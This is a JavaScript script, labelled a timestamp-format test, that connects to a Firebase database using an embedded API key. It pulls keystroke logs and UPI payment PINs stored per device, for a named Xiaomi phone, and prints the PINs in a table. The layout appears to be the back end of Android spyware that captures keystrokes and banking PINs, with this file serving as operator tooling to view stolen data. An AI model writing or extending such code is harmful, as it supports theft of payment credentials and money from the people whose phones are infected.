// Test script to verify timestamp display format
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Test timestamp display format
async function testTimestampDisplay() {
  try {
    console.log('🧪 Testing Timestamp Display Format...\n');
    
    const deviceId = 'Xiaomi 23076PC4BI';
    
    // Test KeyLogs timestamps
    console.log('⌨️ Testing KeyLogs timestamps...');
    const keyLogsSnapshot = await get(ref(database, `Keylogs/${deviceId}`));
    const keyLogs = keyLogsSnapshot.val();
    
    if (keyLogs) {
      console.log('📊 KeyLogs data structure:');
      Object.entries(keyLogs).forEach(([key, log], idx) => {
        console.log(`  Entry ${idx + 1}:`);
        console.log(`    - Key: ${key}`);
        console.log(`    - Timestamp: ${log.timestamp}`);
        console.log(`    - Column1: ${log.Column1}`);
        console.log(`    - Column2: ${log.Column2}`);
        console.log(`    - Column3: ${log.Column3}`);
        console.log(`    - Column4: ${log.Column4}`);
        console.log(`    - Column5: ${log.Column5}`);
        console.log(`    - Column6: ${log.Column6}`);
        console.log('');
      });
    }
    
    // Test UPI Pins timestamps
    console.log('💳 Testing UPI Pins timestamps...');
    const upiPinsSnapshot = await get(ref(database, `UPIPins/${deviceId}`));
    const upiPins = upiPinsSnapshot.val();
    
    if (upiPins) {
      console.log('📊 UPI Pins data structure:');
      Object.entries(upiPins).forEach(([key, pinObj], idx) => {
        console.log(`  Pin ${idx + 1}:`);
        console.log(`    - Key: ${key}`);
        console.log(`    - Pin: ${pinObj.pin}`);
        console.log(`    - Timestamp: ${pinObj.timestamp}`);
        console.log('');
      });
    }
    
    console.log('📋 Expected Display Format:');
    console.log('┌─────────────┬─────────────────────────────────┐');
    console.log('│   Upi Pin   │        Added Date Time          │');
    console.log('├─────────────┼─────────────────────────────────┤');
    if (upiPins) {
      Object.values(upiPins).forEach((pinObj) => {
        const pin = pinObj.pin.padEnd(11);
        const timestamp = pinObj.timestamp.padEnd(33);
        console.log(`│ ${pin} │ ${timestamp} │`);
      });
    }
    console.log('└─────────────┴─────────────────────────────────┘');
    
    console.log('\n🎉 Timestamp display test completed!');
    
  } catch (error) {
    console.error('❌ Error during testing:', error);
  }
}

// Run the test
testTimestampDisplay().then(() => {
  console.log('\n✅ All tests passed!');
  process.exit(0);
}).catch((error) => {
  console.error('\n❌ Test failed:', error);
  process.exit(1);
});
